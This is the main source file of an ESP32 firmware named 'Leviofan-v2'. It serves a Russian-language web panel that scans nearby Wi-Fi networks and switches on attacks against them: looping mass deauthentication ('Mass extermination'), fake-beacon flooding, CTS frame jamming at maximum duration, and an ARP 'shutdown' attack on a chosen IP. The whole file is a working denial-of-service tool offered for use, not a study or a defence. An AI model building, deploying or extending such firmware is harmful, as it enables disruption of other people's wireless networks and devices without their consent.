#include <WiFi.h>
#include <WebServer.h>
#include <vector>
#include "atk.h"
#include "scan.h"
#include "types.h"
#include "saver.h"
#include "global.h"

WebServer server(80);
bool isRunning = false;
bool isRunningBeacon = false;
bool isRunningAuto = false;
bool isRunningSkibidi = false;
bool isRunningCts = false;
bool isRunningArp = false;
AccessPoint* aps;
std::vector<AccessPoint> targets;
uint8_t found;
unsigned long it = 1;
unsigned long worktime = 20000;  //time to rescan in ms
unsigned long uptime;
uint8_t target[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff }; //broadcast
uint8_t tip[4] = { 192, 168, 1, 1 };
bool isConnected = false;
int errorConnCode = 0;
char* targetSSID;
char* targetPassword;

void handleRoot() {
    String html = R"(
    <!DOCTYPE html>
    <html lang="ru">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Leviofan-v2</title>
        </head>
        <body>
        <style>
            html, body {
               height: 100vh; /* Занимает весь доступный размер экрана */
               margin: 0; /* Убираем отступы */
               padding: 0; /* Убираем отступы */
            }

            body {
                font-family: Arial, sans-serif;
                margin: 0;
                padding: 0;
                background:rgba(147, 233, 255, 0.75);
            }
            .table {
                width: 80%;
                border: none;
                margin-bottom: 20px;
            }

            .table thead th {
                font-weight: bold;
                text-align: left;
                border: none;
                padding: 10px 15px;
                background:rgb(33, 211, 255);
                font-size: 14px;
                border-top: 1px solid #ddd;
            }

            .table tr th:first-child, .table tr td:first-child {
                border-left: 1px solid #ddd;
            }

            .table tr th:last-child, .table tr td:last-child {
                border-right: 1px solid #ddd;
            }

            .table thead tr th:first-child {
                border-radius: 20px 0 0 0;
            }

            .table thead tr th:last-child {
                border-radius: 0 20px 0 0;
            }

            .table tbody td {
                text-align: left;
                border: none;
                padding: 10px 15px;
                font-size: 14px;
                vertical-align: top;
            }

            .table tbody tr:nth-child(even) {
                background:rgb(171, 242, 252);
            }

            .table tbody tr:last-child td{
                border-bottom: 1px solid #ddd;
            }

            .table tbody tr:last-child td:first-child {
                border-radius: 0 0 0 20px;
            }

            .table tbody tr:last-child td:last-child {
                border-radius: 0 0 20px 0;
            }

            h1 {
                text-align: center;
                margin-top: 20px;
                font: 700 36px/1.2 'Roboto', sans-serif;
            }

            .btn {
                display: inline-block;
                text-align: center;
                text-decoration: none;
                margin: 2px 0;
                border: solid 1px transparent;
                border-radius: 4px;
                padding: 0.5em 1em;
                color:rgb(0, 0, 0);
                background-color:rgb(186, 230, 255);
            }
            </style>
            <h1>Leviofan-v2</h1>
            <h2>Найденные сети:</h2>
            <table class="table">
                <thead>
                    <tr>
                        <th>№</th>
                        <th>SSID</th>
                        <th>MAC</th>
                        <th>Канал</th>
                        <th>Защита</th>
                    </tr>
                </thead>
    )";
    
  // for (int i = 0; i < found; i++) {
  //   html += "<tr><td>" + String(i) + "</td><td>" + String(WiFi.SSID(i).length()!=0?WiFi.SSID(i):"--hidden--") + "</td><td>" + WiFi.BSSIDstr(i) + "</td><td>" + 
  //           String(WiFi.channel(i)) + "</td><td>" + String(WiFi.encryptionType(i) != WIFI_AUTH_OPEN?"Secure":"Open") + "</td></tr>";
  // }
    char mac[30];
    for (int i = 0; i < found; i++) {
        sprintf(mac, "%02X:%02X:%02X:%02X:%02X:%02X", aps[i].mac[0], aps[i].mac[1], aps[i].mac[2], aps[i].mac[3], aps[i].mac[4], aps[i].mac[5]);
        html += "<tr><td>" + String(i) + "</td><td>" + String(String((char*)(aps[i].ssid)).length()!=0?String((char*)(aps[i].ssid)):"---hidden---") + "</td><td>" + String(mac) + "</td><td>" + 
        String(aps[i].data >> 4) + "</td><td>" + String(aps[i].data << 4 >> 4 ? "Secure" : "Open") + "</td></tr>";
    }
    html += R"(
    </table>
    
    <form method="post" action="/rescan">
        <input type="submit" value="Обновить список сетей", class="btn">
    </form>
    <form method="post" action="/import">
        <input type="submit" value="Получить список сетей из EEPROM", class="btn">
    </form>
    <form method="post" action="/export">
        <input type="submit" value="Сохранить список сетей в EEPROM", class="btn">
    </form>
    <form method="post" action="/run">
        <input type="submit" value="Mass extermination!!! )" + String(isRunning?"<Выкл>":"<Вкл>") + R"(", class="btn">
    </form>
    <form method="post" action="/beacon">
        <input type="submit" value="Флуд фейковыми сетями )" + String(isRunningBeacon?"<Выкл>":"<Вкл>") + R"(", class="btn">
    </form>

    <form method="post" action="/auto">
        <input type="submit" value="Автоматический режим )" + String(isRunningAuto?"<Выкл>":"<Вкл>") + R"(", class="btn">
    </form>
    <form method="post" action="/cts">
        <input type="submit" value="CTS attack )" + String(isRunningCts?"<Выкл>":"<Вкл>") + R"(", class="btn">
    </form>
    <button class="btn" onclick="location.href='/arp'">ARP attack</button>
    <center><p><br>------Fun mode------</br></p></center>
    <form method="post" action="/skibidi">
        <input type="submit" value="Шкибиди тойлет <не работает(>", class="btn">
    </form>
    <center><br>------Debug info------</br></center>
    <p>uptime: )" + String(millis()) + R"(</p>
    <p>m_found )" + String(targets.size()) + R"(</p>
    <p>deauth frames per second: )" + String(deauthPacketsPerSecond) + R"(</p>
    <p>beacon frames per second: )" + String(beaconPacketsPerSecond) + R"(</p>
    <form method="post" action="/memchk">
        <input type="submit" value="Check mem", class="btn">
    </form>
    </body>
    </html>
    )";
    server.send(200, "text/html", html);
}


void handleArp() {
    String html = R"(
        <!DOCTYPE html>
        <html lang="ru">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Leviofan-v2</title>
        </head>
        <body>
        <style>
            html, body {
               height: 100vh; /* Занимает весь доступный размер экрана */
               margin: 0; /* Убираем отступы */
               padding: 0; /* Убираем отступы */
            }

            body {
                font-family: Arial, sans-serif;
                margin: 0;
                padding: 0;
                background:rgba(147, 233, 255, 0.75);
            }
            h1 {
                text-align: center;
                margin-top: 20px;
                font: 700 36px/1.2 'Roboto', sans-serif;
            }

            .btn {
                display: inline-block;
                text-align: center;
                text-decoration: none;
                margin: 2px 0;
                border: solid 1px transparent;
                border-radius: 4px;
                padding: 0.5em 1em;
                color:rgb(0, 0, 0);
                background-color:rgb(186, 230, 255);
            }
            </style>
            <h1>ARP attack page</h1>
                            <form action="/submitWifi" method="POST">
                            <input type="text" name="SSID" placeholder="Введите название AP..." required>
                            <br>
                            <input type="text" name="password" placeholder="Введите пароль от AP..." required>
                            <input type="submit" value="Подключиться">
                            <input type="text" name="targetIP" placeholder="Введите IP-адрес цели" >
                            </form>
                            <br>
                            </body>
                            )";
                html += "<p>Статус:" + String(isConnected ? "Подключено" : "Не подключено") + "</p><p>Код ошибки:" + String(errorConnCode) + "</p>";
                html += R"(
                            </br>
                            <form method="post" action="/startArp">
                                <input type="submit" value="Шатдаун )";
                html += String(isRunningArp ? "<Выкл>" : "<Вкл>");
                html += R"(", class="btn">
                            </form>
            </body>
    )";
    server.send(200, "text/html", html);
}

void handleStartArp() {
    if (WiFi.status() != WL_CONNECTED) {
        server.send(200, "text/plain", "Not connected to WiFi");
        return;
    }
    isRunningArp = !isRunningArp;
    server.send(200, "text/plain", "Activating....");
}

void handleGetData() {
    if (server.hasArg("SSID") && server.hasArg("password")) {
        uint8_t ssid_len = server.arg("SSID").length();
        uint8_t pass_len = server.arg("password").length();
        if (targetSSID != nullptr) {
            free(targetSSID);
            targetSSID = nullptr;
        }
        if (targetPassword != nullptr) {
            free(targetPassword);
            targetPassword = nullptr;
        }
        targetSSID = (char*)malloc(ssid_len + 1);
        targetPassword = (char*)malloc(pass_len + 1);
        for (uint8_t i = 0; i < ssid_len; i++) {
            targetSSID[i] = server.arg("SSID")[i];
        }
        targetSSID[ssid_len] = '\0'; // Null-terminate the string
        for (uint8_t i = 0; i < pass_len; i++) {
            targetPassword[i] = server.arg("password")[i];
        }
        targetPassword[pass_len] = '\0'; // Null-terminate the string
        Serial.printf("SSID: %s, Password: %s\n", targetSSID, targetPassword);
        uint8_t status = connect_wifi(targetSSID, targetPassword);
    } else {
        isConnected = false;
        errorConnCode = 100; // Error code for missing arguments
    }
    if (server.hasArg("targetIP")) {
        Serial.println("IP selected");
        String targetIP = server.arg("targetIP");
        if (targetIP.length() > 0) {
            int dot1 = targetIP.indexOf('.');
            int dot2 = targetIP.indexOf('.', dot1 + 1);
            int dot3 = targetIP.indexOf('.', dot2 + 1);
            if (dot1 != -1 && dot2 != -1 && dot3 != -1) {
                String ipPart1 = targetIP.substring(0, dot1);
                String ipPart2 = targetIP.substring(dot1 + 1, dot2);
                String ipPart3 = targetIP.substring(dot2 + 1, dot3);
                String ipPart4 = targetIP.substring(dot3 + 1);
                if (ipPart1.length() > 0 && ipPart2.length() > 0 && ipPart3.length() > 0 && ipPart4.length() > 0) {
                    tip[0] = ipPart1.toInt();
                    tip[1] = ipPart2.toInt();
                    tip[2] = ipPart3.toInt();
                    tip[3] = ipPart4.toInt();
                    Serial.printf("Target IP set to: %d.%d.%d.%d\n", tip[0], tip[1], tip[2], tip[3]);
                } else {
                    Serial.println("Invalid IP address format");
                }
            } else {
                Serial.println("Invalid IP address format");
            }
        }
    }
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAP(SSID, PASSWORD, CHANNEL, 0, 1);
}

void handleMemchk() {
    server.send(200, "text/plain", String(ESP.getFreeHeap()));
    heap_caps_print_heap_info( MALLOC_CAP_INTERNAL );

}

void handleRescan() {
    server.sendHeader("Location", "/");
    server.send(301);
    initScan(&found);
    free(aps);
    aps = scan();
    for (int i = 0; i < found; i++) {
        bool exists = false;
        for (int j = 0; j < targets.size(); j++) {
            if (memcmp(aps[i].mac, targets[j].mac, 6) == 0) {
                exists = true;
                break;
            }
        }
        if (!exists) {
            targets.push_back(aps[i]);
        }
    }
}

void clearRescan() {
    initScan(&found);
    free(aps);
    aps = scan();
    for (int i = 0; i < found; i++) {
        bool exists = false;
        for (int j = 0; j < targets.size(); j++) {
            if (memcmp(aps[i].mac, targets[j].mac, 6) == 0) {
                exists = true;
                break;
            }
        }
        if (!exists) {
            targets.push_back(aps[i]);
        }
    }
}

void handleRun() {
    server.sendHeader("Location", "/");
    server.send(301);
    isRunning = !isRunning;
    if (isRunning) {
        free(aps);
        aps = (AccessPoint*)malloc(targets.size() * sizeof(AccessPoint));
            for (int i = 0; i < targets.size(); i++) {
                memcpy(&aps[i], &targets[i], sizeof(AccessPoint));
        }
    }
    Serial.printf("isRunning: %d\n", isRunning);
}

void handleExport() {
    server.sendHeader("Location", "/");
    server.send(301);
    AccessPoint *tmp = (AccessPoint *)calloc(targets.size(), sizeof(AccessPoint));
    for (int i = 0; i < targets.size(); i++) {
        memcpy(&tmp[i], &targets[i], sizeof(AccessPoint));
    }
    importAP(tmp, (uint8_t)targets.size());
    free(tmp);
}

void handleImport() {
    server.sendHeader("Location", "/");
    server.send(301);
    AccessPoint *tmp;
    exportAP(&tmp, &found);
    if (aps != nullptr) free(aps);
    aps = tmp;
    targets.clear();
    for (int i = 0; i < found; i++) {
        Serial.println(*tmp[i].ssid);
        targets.push_back(tmp[i]);
    }
}


void handleBeacon() {
    server.sendHeader("Location", "/");
    server.send(301);
    isRunningBeacon = !isRunningBeacon;
}

void handleAuto() {
    server.sendHeader("Location", "/");
    server.send(301);
    isRunning = !isRunning;
    isRunningAuto = !isRunningAuto;
}

void handleSkibidi() {
    server.sendHeader("Location", "/");
    server.send(301);
    isRunningSkibidi = !isRunningSkibidi;
}

void handleCts() {
    server.sendHeader("Location", "/");
    server.send(301);
    isRunningCts = !isRunningCts;
}

void createServer() {
    server.begin(80);
    server.on("/", handleRoot);
    server.on("/rescan", handleRescan);
    server.on("/run", handleRun);
    server.on("/export", handleExport);
    server.on("/import", handleImport);
    server.on("/beacon", handleBeacon);
    server.on("/auto", handleAuto);
    server.on("/skibidi", handleSkibidi);
    server.on("/memchk", handleMemchk);
    server.on("/cts", handleCts);
    server.on("/arp", handleArp);
    server.on("/submitWifi", HTTP_POST, handleGetData);
    server.on("/startArp", handleStartArp);
}

void tickServer() {
    server.handleClient();
}

uint8_t esp_mac_addr[MAC_ADDRESS_LENGTH];   // ESP MAC address

//=======================================================================
//                     SETUP
//=======================================================================
void setup() {
    Serial.begin(115200);
    WiFi.disconnect(true, true);  // yay i love esp32
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAP(SSID, PASSWORD, CHANNEL, 0, 1);
    uptime = millis();
    clearRescan();
    createServer();
    prepareSave();
    spammerPreparer();
    WiFi.macAddress(esp_mac_addr);  // Get ESP32 MAC address
    Serial.println("End of init.");
}


//=======================================================================
//                        LOOP
//=======================================================================
void loop() {
    tickServer();
    static unsigned long lastDeauthTime = 0;
    static unsigned long lastBeaconTime = 0;
    static unsigned long deauthInterval = 1000 / maxDeauthPacketsPerSecond;
    static unsigned long beaconInterval = 1000 / maxBeaconPacketsPerSecondForAP;
    static unsigned long lastCts = 0;
    static unsigned long ctsPacketsPerSecond = 700000;
    static unsigned long ctsCounter = 0;
    static unsigned long ctsInterval = 1000 / ctsPacketsPerSecond;
    static unsigned long lastArp = 0;
    static unsigned long arpPacketsPerSecond = 10;
    static unsigned long arpCounter = 0;
    static unsigned long arpInterval = 1000 / arpPacketsPerSecond;

    if (isRunning) {
        if (isRunningAuto && worktime <= millis() - uptime) {
                Serial.printf("%u", uptime);
                Serial.print("Rescanning...\n");
                initScan(&found);
                free(aps);
                aps = scan();
                uptime = millis();
                it = 0;
        }

        if (millis() - lastDeauthTime >= deauthInterval) {
                sendDeauthPacket(aps + it, target);
                it++;
                if (it >= found) {
                        it = 0;
                }
                lastDeauthTime = millis();
        }
    }

    if (millis() - lastBeaconTime >= beaconInterval) {
        beaconSpammer(&isRunningBeacon);
        lastBeaconTime = millis();
    }

    if (isRunningCts) {
        // if (millis() - lastCts > 1000) {
        //     lastCts = millis();
        //     ctsPacketsPerSecond = ctsCounter / 1;
        //     ctsCounter = 0;
        // }
        // sendCtsPacket(aps + 0, target);
        // it++;
        // if (it >= found) {
        //     it = 0;
        // }
        static uint8_t channel = 1;
        send_cts_frame(channel, (uint16_t)-1); // sending w/o delay and with max duration
        channel++;
    }

    if (isRunningArp) {
        if (millis() - lastArp >= arpInterval) {
            sendArpPacket((ipv4_t *)tip, (mac_address_t *)esp_mac_addr, (ipv4_t *)tip, (mac_address_t *)esp_mac_addr);
            arpCounter++;
            lastArp = millis();
        }
        if (arpCounter >= arpPacketsPerSecond) {
            arpCounter = 0;
        }
    }
}
//=====================================================================
